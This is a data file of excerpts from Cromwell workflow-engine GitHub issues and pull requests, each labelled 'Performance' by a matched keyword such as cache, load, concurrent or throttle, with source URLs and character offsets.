Performance,"Dear Alexis,; many thanks for the suggestion. I have checked and the files seem to be correctly hard-linked in our case and the folder sizes are as they should be. We have about 1Tb of reference files and the `cromwell-executions` directory with several workflow folders is only about 1.2 Tb in size, so it appears that the files are not being copied, but correctly hard-linked. ; I have checked again and it seems that the cap is at about 35 concurrently submitted tasks, even when several workflows are submitted, each set to scatter about 20-30 jobs. When running the jobs outsite cromwell server mode, we usually have several jobs in the ""pending"" state on slurm, but cromwell never submits more than 35 at once and the jobs never get to the pending list. It is almost as if there is some kind of hard limit in the number of jobs submitted, not controlled by the `concurrent-job-limit`. ; Thanks again! Best,; Ales",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-652434370:443,concurren,concurrently,443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-652434370,2,['concurren'],"['concurrent-job-limit', 'concurrently']"
Performance,"Dear WDL team,. I am using joint-discovery-gatk4.wdl for running jointcalling on 6000 plus samples using LSF as scheduler. I have lsf configuration file which was working with small set of samples. When I tried running Jointcalling on 6000+ samples using WDL, it is giving the below error.; ; **[2019-12-04 10:59:03,89] [ESC[38;5;220mwarnESC[0m] JobExecutionTokenDispenser - High load alert. Freeze token distribution.**; ; And I changed the concurrent-job-limit = 5000 in lsf configuration, now it is giving; ; **[2019-12-01 07:08:46,91] [info] WorkflowExecutionActor-b2c84d70-611d-4dad-bb18-78a6648e4113 [^[[38;5;2mb2c84d70^[[0m]: Starting JointGenotyping.ImportGVCFs (195 shards); [2019-12-01 07:15:32,84] [^[[38;5;1merror^[[0m] Failed to summarize metadata; java.sql.SQLException: java.lang.OutOfMemoryError: GC overhead limit exceeded**. Could you please help me to proceed further. Thanks In Advance; Fazulur Rehaman",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5305:380,load,load,380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5305,2,"['concurren', 'load']","['concurrent-job-limit', 'load']"
Performance,Debug Cache miss,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:6,Cache,Cache,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['Cache'],['Cache']
Performance,"Definitely not for prod but could be useful for dev purposes when one wants to spin up a few Cromwells on the same DB. A load balancer in front routes requests to underlying Cromwells talking to a MySQL instance. For example:. ```; $ docker-compose -f scripts/docker-compose-mysql/docker-compose-cloudwell.yml up --scale cromwell=3 -d; Starting docker-compose-mysql_mysql-db_1 ... done; Starting docker-compose-mysql_cromwell_1 ... done; Starting docker-compose-mysql_cromwell_2 ... done; Starting docker-compose-mysql_cromwell_3 ... done; Starting docker-compose-mysql_lb_1 ... done. $ docker ps; CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES; 9311d2f053d6 broadinstitute/cromwell:develop ""/bin/bash -c 'java …"" 6 minutes ago Up 15 seconds 8000/tcp docker-compose-mysql_cromwell_3; e040065fe3ba broadinstitute/cromwell:develop ""/bin/bash -c 'java …"" 6 minutes ago Up 15 seconds 8000/tcp docker-compose-mysql_cromwell_2; aff5007b8d26 dockercloud/haproxy ""/sbin/tini -- docke…"" 7 minutes ago Up 14 seconds 443/tcp, 1936/tcp, 0.0.0.0:8000->80/tcp docker-compose-mysql_lb_1; b991a7c412a5 broadinstitute/cromwell:develop ""/bin/bash -c 'java …"" 7 minutes ago Up 15 seconds 8000/tcp docker-compose-mysql_cromwell_1; 30892dce18b2 mysql:5.7 ""docker-entrypoint.s…"" 17 minutes ago Up 18 seconds (healthy) 0.0.0.0:3306->3306/tcp docker-compose-mysql_mysql-db_1; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4044:121,load,load,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4044,1,['load'],['load']
Performance,Desired behavior is to decrease this latency.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1497#issuecomment-250271058:37,latency,latency,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1497#issuecomment-250271058,1,['latency'],['latency']
Performance,Despite the text in the issue I'm assuming you meant `concurrent-job-limit`?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-274351812:54,concurren,concurrent-job-limit,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-274351812,1,['concurren'],['concurrent-job-limit']
Performance,Determining cache misses (or hits) is slow for jobs with bam file inputs on a local backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1483:12,cache,cache,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1483,1,['cache'],['cache']
Performance,Detritus missing for call cache jobs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4622:26,cache,cache,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4622,1,['cache'],['cache']
Performance,Digester for Workflow metadata for performance comparison (Part II) [BA-6419],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5505:35,perform,performance,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5505,2,['perform'],['performance']
Performance,Digester for Workflow metadata for performance comparison (part I) [BA-6349],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5501:35,perform,performance,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5501,1,['perform'],['performance']
Performance,Disambiguate actor name by including source cache entry ID.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2007:44,cache,cache,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2007,1,['cache'],['cache']
Performance,Do you think there would be value in showing whether a call is used as the cached result for other calls?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-199772199:75,cache,cached,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-199772199,1,['cache'],['cached']
Performance,"Docker Hub is incredibly slow when accessed directly from Hangzhou or any other location within China. There is no known Alibaba Cloud provided CDN or cache for docker images on BCS. To significantly speed up docker pulls users are able to upload docker images to their own private docker registry hosted within one of their OSS buckets. This uses a plugin contributed to the docker codebase that stores and retrieves docker images via an OSS client. Currently the BCS backend allows users to specify the private OSS registry within the `docker` runtime attribute. For portability, the `docker` runtime attribute should only specify the image, and a separate `dockerRegistry` runtime attribute should optionally specify a private OSS registry. Ideally there should be a way for a user to cache docker images on their own private OSS registry while still using contributed by others WDLs. One particular issue for call caching may be that the docker image hashes are probably registry specific. Cromwell's call caching code requires WDL to specify a hash that may only be available on docker hub, and may not be available on an OSS mirror, even if the image contains the exact same content. Also it should be decided if the BCS backend should behave like the JES/PAPI backend and only allow jobs that specify a `docker` runtime attribute, or if the behavior should continue to be like the `Local`/`SFS` backends and allow running jobs on the bare VM without a docker container. Links regarding BCS/OSS and docker:; - ([EN translation](https://translate.google.com/translate?hl=en&sl=zh-CN&tl=en&u=https%3A%2F%2Fhelp.aliyun.com%2Fdocument_detail%2F28022.html)) https://help.aliyun.com/document_detail/28022.html; - ([EN translation](https://translate.google.com/translate?hl=en&sl=zh-CN&tl=en&u=https%3A%2F%2Fhelp.aliyun.com%2Fdocument_detail%2F42402.html)) https://help.aliyun.com/document_detail/42402.html; - https://docs.docker.com/registry/storage-drivers/; - https://github.com/docker/distribution",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518:151,cache,cache,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518,2,['cache'],['cache']
Performance,"Docker requires all image lookups to be qualified by a repository name. For Broad images our repository is ""broadinstitute"", and in our WDLs we request Broad images with the repository explicitly specified a la ""broadinstitute/genomes-in-the-cloud"". The more universal images like ""ubuntu"" don't require an explicit repository specification in casual parlance, but still require a default repository specification of ""library"" for hash lookups. When a Docker image is specified in WDL that includes a hash, Cromwell skips the hash lookup and just hashes the image name. Cromwell 26 would use essentially the Docker image string that had been specified in the WDL, i.e. something like `ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`. Cromwell 27 inadvertently changed the internal representation of the image string to prepend the `library/` repository even when it hadn't been explicitly specified in the WDL. This meant that the Docker string would hash differently on 27 than it did on 26, resulting in unwanted cache misses. These changes look to track whether a repository has been explicitly specified or not, and only prepend the `library/` where required on hash lookups.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081:1047,cache,cache,1047,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081,1,['cache'],['cache']
Performance,Document concurrent-job-limit,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841:9,concurren,concurrent-job-limit,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841,1,['concurren'],['concurrent-job-limit']
Performance,Document performance improvement for input and output localization on PAPI v2. [BA-5904],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112:9,perform,performance,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112,1,['perform'],['performance']
Performance,Document that concurrent-job-limit is available on all backends,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1751:14,concurren,concurrent-job-limit,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1751,1,['concurren'],['concurrent-job-limit']
Performance,Document the usage of a singularity cache. Encourage users to use the --containall flag with singularity.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515:36,cache,cache,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515,1,['cache'],['cache']
Performance,"Document(OWLOntologyManagerImpl.java:974) cwl.ontology.Schema$.$anonfun$loadOntologyFromIri$5(Schema.scala:155) cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85) -------------------------------------------------------------------------------- Parser: org.semanticweb.owlapi.oboformat.OBOFormatOWLAPIParser@6bd28ad6 Stack trace: LINENO: 1 - Could not find tag separator ':' in line. LINE: <?xml version=""1.0""?> org.semanticweb.owlapi.oboformat.OBOFormatOWLAPIParser.parse(OBOFormatOWLAPIParser.java:50) uk.ac.manchester.cs.owl.owlapi.OWLOntologyFactoryImpl.loadOWLOntology(OWLOntologyFactoryImpl.java:193) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.load(OWLOntologyManagerImpl.java:1071) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntology(OWLOntologyManagerImpl.java:1033) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntologyFromOntologyDocument(OWLOntologyManagerImpl.java:974) cwl.ontology.Schema$.$anonfun$loadOntologyFromIri$5(Schema.scala:155) cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85) cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303) LINENO: 1 - Could not find tag separator ':' in line. LINE: <?xml version=""1.0""?> org.obolibrary.oboformat.parser.OBOFormatParser.error(OBOFormatParser.java:1337) org.obolibrary.oboformat.parser.OBOFormatParser.getParseTag(OBOFormatParser.java:760) org.obolibrary.oboformat.parser.OBOFormatParser.parseHeaderClause(OBOFormatParser.java:409) org.obolibrary.oboformat.parser.OBOFormatParser.parseHeaderClauseNl(OBOFormatParser.java:402) org.obolibrary.oboformat.parser.OBOFormatParser.parseHeaderFrame(OBOFormatParser.java:385) org.obolibrary.oboformat.parser.OBOFormatParser.parseOBODoc(OBOFormatParser.java:266) org.obolibrary.oboformat.parser.OBOFormat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372:5101,load,loadOntologyFromIri,5101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372,1,['load'],['loadOntologyFromIri']
Performance,Don't attempt to dequeue from empty queues,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4909:36,queue,queues,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4909,1,['queue'],['queues']
Performance,Don't implicitly add a library/ repo prefix to Docker images as that breaks 26-era call caches.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2361:88,cache,caches,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2361,1,['cache'],['caches']
Performance,Don't let Cromwell start if a service fails to load. Closes #896,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1192:47,load,load,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1192,1,['load'],['load']
Performance,Don't retry tests that expect cache hits from specific workflows [CROM-6807],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6657:30,cache,cache,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657,1,['cache'],['cache']
Performance,Don't return cache hits that have explicitly been invalidated,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2000:13,cache,cache,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2000,1,['cache'],['cache']
Performance,Don't return invalidated cache entries,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2004:25,cache,cache,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2004,1,['cache'],['cache']
Performance,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:659,throttle,throttle,659,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709,2,['throttle'],['throttle']
Performance,"During code review for #1836 @cjllanwarne noted that `processSource` in what is currently named `WorkflowStoreActor` and most likely `WorfklowStoreSubmitActor` by the time this is acted upon looked suspicious as we had (we think) intended json validation to not happen until later and a workflow ID would always be handed back to the user. Further, the failed Future doesn't appear to be getting handed back to the API at all (I think), which would lead to a timeout response. Further since the sources are being processed monadically it is possible for a user to have multiple borked files but only the first will be reported (if we were reporting). Check into what's up here - either don't perform this check on submission or ensure that appropriate error messages are handed back",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882:692,perform,perform,692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882,1,['perform'],['perform']
Performance,"During the testing hackathon, we discovered a number of problems caused by the eventual consistency of the metadata service. One specific case of this is the granularity of the events. . On one side, we have a publisher who has a whole collection of events that they would like to push. They push them one event at a time to the MD service. Because even things like array elements are pushed one update at a time because of MD format, we run into the situation where a consumer can see half of an array. Taken to the extreme, we could push every char of a string as a separate event. The fundamental problem with these partial updates is that a downstream consumer can not tell if an update is complete. Do they wait? How long? Can they check if the data is done?. While this touches on a larger problem in distributed computing, I think we are shooting ourselves in the foot by making every piece of a single update an async, isolated event. Taken to the extreme, we could push every char of a string as a separate event. The proposal is to extend the PutMetadataAction to take in a Seq/Varargs of MetadataEvents with the contract that these will be made available atomically (e.g. in a single Slick transaction for our implementation). Then in places where we basically unrolling a bundle of events to publish, we should use this API (e.g. WorkflowExecutionActor) to do that atomically. . In theory, this should also help with the scalability as the MD service can persist things with batchinserts in single transaction. For larger workflows, currently this would be hundreds or thousands of transactions.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/930:1433,scalab,scalability,1433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/930,1,['scalab'],['scalability']
Performance,"E"", ""value"": ""/cromwell_root/HC_GVCF-23-rc.txt""}, ; {""name"": ""AWS_CROMWELL_WORKFLOW_ROOT"", ; ""value"": ""s3://dev-nphi-cromwell-v8/cromwell-execution/TN_workflow/2b65d83d-7d30-465e-9127-95c6886056e4/call-Haplotypecaller/shard-1/hc.Haplotypecaller/cfe96bd8-ee6b-4ba5-8ed8-198e6f5f9589/""}; ], ; ""vcpus"": 16, ; ""command"": [; ""gzipdata"", ""/bin/bash"", ""-c"", ; ""...""; ], ; ""volumes"": [{""host"": {; ""sourcePath"": ""/cromwell_root/hc.Haplotypecaller/hc.HC_GVCF/cfe96bd8-ee6b-4ba5-8ed8-198e6f5f9589/Some(23)/1""}, ""name"": ""local-disk""}], ; ""memory"": 32000, ""ulimits"": [], ""exitCode"": 0}, ; ""parameters"": {}, ; ""jobDefinition"": ""arn:aws:batch:us-east-1:260062248592:job-definition/hc_Haplotypecaller-hc_HC_GVCF:19527"", ; ""statusReason"": ""Essential container in task exited"", ; ""jobId"": ""7c2d29c2-f04e-4b3f-8579-915a6fbc9033"", ; ""attempts"": [{; ""startedAt"": 1558552881926, ""container"": {; ""taskArn"": ""arn:aws:ecs:us-east-1:260062248592:task/78221618-403c-4b10-b9e1-6c1534a44723"", ; ""containerInstanceArn"": ""arn:aws:ecs:us-east-1:260062248592:container-instance/3cfe8456-fd3e-420d-91bc-aa1d8d134194"", ; ""logStreamName"": ""hc_Haplotypecaller-hc_HC_GVCF/default/78221618-403c-4b10-b9e1-6c1534a44723"", ; ""exitCode"": 0}, ""stoppedAt"": 1558553539743, ""statusReason"": ""Essential container in task exited""}], ; ""jobQueue"": ""arn:aws:batch:us-east-1:260062248592:job-queue/GenomicsDefaultQueue-80d8b8f0-15ed-11e9-b8b7-12ddf705bbc4"", ; ""dependsOn"": [], ; ""startedAt"": 1558552881926, ; ""jobName"": ""Haplotypecaller_HC_GVCF"", ; ""createdAt"": 1558552763368, ""stoppedAt"": 1558553539743}]}; ```. Clearly, the AWS Batch job parameters are referencing a completely different set of input files from the set described in the workflow log. In this particular case, the job described in the log was started via cromwell run using v36 on an isolated EC2 instance, while the workflow described by the job parameters json was submitted to a cromwell v36.1 server running on a completely separate EC2 instance. This would point to call caching N",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004:15755,queue,queue,15755,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004,1,['queue'],['queue']
Performance,"E, file = 93DAD89F707FA490E2A46FFAC924DFFF.; [2023-03-29 12:35:42,07] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,08] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1-20000000024 [b303ae23expanse_figures.CBL_hom_not_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,08] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:1972,cache,cache,1972,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['cache'],['cache']
Performance,"E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c42b47 | callRoot | test.hello | NULL | 1 | s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello | 2018-11-21 15:09:10.588000 | string |; | 4762 | 02306258-436a-4372-ab54-2dcd83c42b47 | commandLine | test.hello | NULL | 1 | echo 'Hello World!' > ""helloWorld.txt"" | 2018-11-21 15:09:10.767000 | string |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:1713,Cache,Cache,1713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,2,['Cache'],['Cache']
Performance,"EDIT: The final (non-scattered) task didn't print out the `Failed copying cache results, falling back to running job` message but the timing diagram shows that it clearly transitioned quickly from BackendIsCopyingCallCacheOutputs to spend the same time ""RunningJob"" as everything else. Happened for all the scatters of a hello world workflow:. ```; 2016-09-20 18:53:47,051 cromwell-system-akka.dispatchers.engine-dispatcher-37 ERROR - helloArray.helloWorld:79:1: Failed copying cache results, falling back to running job: java.lang.RuntimeException: The call detritus files for source cache hit aren't found for call helloArray.helloWorld; 2016-09-20 18:53:47,052 cromwell-system-akka.dispatchers.backend-dispatcher-66 INFO - SharedFileSystemAsyncJobExecutionActor [UUID(55d1e515)helloArray.helloWorld:79:1]: `echo ""hello, world""`; 2016-09-20 18:53:47,053 cromwell-system-akka.dispatchers.backend-dispatcher-66 INFO - SharedFileSystemAsyncJobExecutionActor [UUID(55d1e515)helloArray.helloWorld:79:1]: executing: /bin/bash /Users/chrisl/IdeaProjects/cromwell/cromwell-executions/helloArray/55d1e515-90fb-4d96-a025-b19a7decd1f4/call-helloWorld/shard-79/execution/script; 2016-09-20 18:53:47,053 cromwell-system-akka.dispatchers.backend-dispatcher-66 INFO - SharedFileSystemAsyncJobExecutionActor [UUID(55d1e515)helloArray.helloWorld:79:1]: command: ""/bin/bash"" ""/Users/chrisl/IdeaProjects/cromwell/cromwell-executions/helloArray/55d1e515-90fb-4d96-a025-b19a7decd1f4/call-helloWorld/shard-79/execution/script.submit""; 2016-09-20 18:53:47,059 cromwell-system-akka.dispatchers.backend-dispatcher-66 INFO - SharedFileSystemAsyncJobExecutionActor [UUID(55d1e515)helloArray.helloWorld:79:1]: job id: 89817; 2016-09-20 18:53:47,907 cromwell-system-akka.dispatchers.engine-dispatcher-37 INFO - WorkflowExecutionActor-55d1e515-90fb-4d96-a025-b19a7decd1f4 [UUID(55d1e515)]: Job helloArray.helloWorld:79:1 succeeded!; ```. The workflow:. ```; task helloWorld {; command { echo ""hello, world"" }; output { String s =",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1461:74,cache,cache,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1461,3,['cache'],['cache']
Performance,"EDIT: to safe yourself some data entry, you can use branch [cjl_initial_work_dir_requirement_4](https://github.com/broadinstitute/cromwell/tree/cjl_initial_work_dir_requirement_4) as an entry point with the centaur test and a Spec already added. This seems to be a pretty common pattern but relies on `JSON.stringify(inputs)` working in our expression evaluator:; ```yml; # A common use case: stringy the inputs JSON and provide that file as another input file. cwlVersion: v1.0; $graph:; - id: stringify_inputs; class: CommandLineTool; baseCommand: ['grep', 'number', 'inputs.json']; requirements:; - class: DockerRequirement; dockerPull: ""python:3.5.0""; - class: InitialWorkDirRequirement; listing:; - entryname: 'inputs.json'; entry: $(JSON.stringify(inputs)). stdout: ""number_field"". # TODO CWL: Set the types more appropriately (depends on issue #3059); inputs:; - id: number; type: string; default: 27; - id: str; type: string; default: wooooo; - id: boolean; type: string; default: True; outputs:; - id: number_field_output; type: string; outputBinding:; glob: number_field; loadContents: true; outputEval: $(self[0].contents.trim()); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090:1082,load,loadContents,1082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090,1,['load'],['loadContents']
Performance,"Encapsulate `ExecutionStore`, optimize a bit.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1977:30,optimiz,optimize,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1977,1,['optimiz'],['optimize']
Performance,Error: Could not load UVM kernel module. Is nvidia-modprobe installed?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4935:17,load,load,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4935,1,['load'],['load']
